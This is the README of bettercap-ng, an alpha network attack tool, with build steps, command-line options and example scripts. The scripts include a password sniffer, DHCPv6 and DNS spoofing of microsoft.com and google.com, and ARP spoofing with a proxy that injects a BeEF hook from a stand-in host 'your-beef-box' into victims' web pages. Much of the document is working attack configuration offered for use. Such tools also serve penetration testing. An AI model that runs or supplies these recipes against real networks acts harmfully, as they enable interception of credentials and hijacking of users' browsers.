<p align="center">
  <img alt="BetterCap" src="https://www.bettercap.org/assets/logo.png" height="140" />
  <h3 align="center">bettercap-ng</h3>
  <p align="center">
    <a href="https://github.com/evilsocket/bettercap-ng/releases/latest"><img alt="Release" src="https://img.shields.io/github/release/evilsocket/bettercap-ng.svg?style=flat-square"></a>
    <a href="/LICENSE"><img alt="Software License" src="https://img.shields.io/badge/license-GPL3-brightgreen.svg?style=flat-square"></a>
    <a href="https://travis-ci.org/evilsocket/bettercap-ng"><img alt="Travis" src="https://img.shields.io/travis/evilsocket/bettercap-ng/master.svg?style=flat-square"></a>
    <a href="https://goreportcard.com/report/github.com/evilsocket/bettercap-ng"><img alt="Go Report Card" src="https://goreportcard.com/badge/github.com/evilsocket/bettercap-ng?style=flat-square&fuckgithubcache=1"></a>
  </p>
</p>

---

This is a WIP of the new version of [bettercap](https://github.com/evilsocket/bettercap), very alpha, **do not use** ... or do, whatever.

## Compiling

Make sure you have a correctly configured Go >= 1.8 environment and the `libpcap-dev` package installed for your system, then:

    git clone https://github.com/evilsocket/bettercap-ng $GOPATH/src/github.com/evilsocket/bettercap-ng
    cd $GOPATH/src/github.com/evilsocket/bettercap-ng
    make deps
    make

To show the command line options:

    # sudo ./bettercap-ng -h
    
    Usage of ./bettercap-ng:
      -caplet string
            Read commands from this file and execute them in the interactive session.
      -debug
            Print debug messages.
      -eval string
            Run a command, used to set variables via command line.
      -iface string
            Network interface to bind to.
      -no-history
            Disable history file.
      -silent
            Suppress all logs which are not errors.

## Caplets

Interactive sessions can be scripted with `.cap` files, or `caplets`, the following are a few basic examples, look the `caplets` folder for more.

#### caplets/simple-password-sniffer.cap

Simple password sniffer.

```sh
# keep reading arp table for network mapping
net.recon on
# setup a regular expression for packet payloads
set net.sniff.regexp .*password=.+
# set the sniffer output file
set net.sniff.output passwords.pcap
# start the sniffer
net.sniff on
```

#### caplets/mitm6.cap

Reroute DNS requests by using DHCPv6 replies, start a HTTP server and DNS spoofer for `microsoft.com` and `google.com`.

```sh
# let's spoof Microsoft and Google ^_^
set dns.spoof.domains microsoft.com, google.com
set dhcp6.spoof.domains microsoft.com, google.com

# every request http request to the spoofed hosts will come to us
# let's give em some contents
set http.server.path caplets/www

# check who's alive on the network
net.recon on
# serve files
http.server on
# redirect DNS request by spoofing DHCPv6 packets
dhcp6.spoof on
# send spoofed DNS replies ^_^
dns.spoof on

# set a custom prompt for ipv6
set $ {by}{fw}{cidr} {fb}> {env.iface.ipv6} {reset} {bold}» {reset}
# clear the events buffer and the screen
events.clear
clear
```

<center>
    <img src="https://pbs.twimg.com/media/DTXrMJJXcAE-NcQ.jpg:large" width="100%"/>
</center>

#### caplets/rest-api.cap

Start a rest API.

```sh
# change these!
set api.rest.username bcap
set api.rest.password bcap
# set api.rest.port 8082

# actively probe network for new hosts
net.probe on
net.recon on

# enjoy /api/session and /api/events
api.rest on
```

Get information about the current session:

    curl -k --user bpcap:bcap https://bettercap-ip:8083/api/session

Execute a command in the current interactive session:

    curl -k --user bcap:bcap https://bettercap-ip:8083/api/session -H "Content-Type: application/json" -X POST -d '{"cmd":"net.probe on"}'

Get last 50 events:

    curl -k --user bpcap:bcap https://bettercap-ip:8083/api/events?n=50

Clear events:

    curl -k --user bpcap:bcap -X DELETE https://bettercap-ip:8083/api/events

<center>
    <img src="https://pbs.twimg.com/media/DTAreSCX4AAXX6v.jpg:large" width="100%"/>
</center>

#### caplets/beef-inject.cap

Use a proxy script to inject a BEEF javascript hook:

```sh
# targeting the whole subnet by default, to make it selective:
#
#   sudo ./bettercap-ng -caplet caplets/beef-active.cap -eval "set arp.spoof.targets 192.168.1.64"

# inject beef hook
set http.proxy.script caplets/beef-inject.js
# keep reading arp table for network mapping
net.recon on
# redirect http traffic to a proxy
http.proxy on
# wait for everything to start properly
sleep 1
# make sure probing is off as it conflicts with arp spoofing
arp.spoof on
```

The `caplets/beef.inject.js` proxy script file:

```javascript
function onLoad() {
    console.log( "BeefInject loaded." );
    console.log("targets: " + env['arp.spoof.targets']);
}

function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                '</head>', 
                '<script type="text/javascript" src="http://your-beef-box:3000/hook.js"></script></head>' 
            ); 
            res.Updated();
        }
    }
}
```

## Interactive Mode

Interactive mode allows you to start and stop modules manually on the fly, change options and apply new firewall rules on the fly, to show the help menu type `help`, you can have module specific help by using `help module-name`.

## License

`bettercap` and `bettercap-ng` are made with ♥  by [Simone Margaritelli](https://www.evilsocket.net/) and they're released under the GPL 3 license.
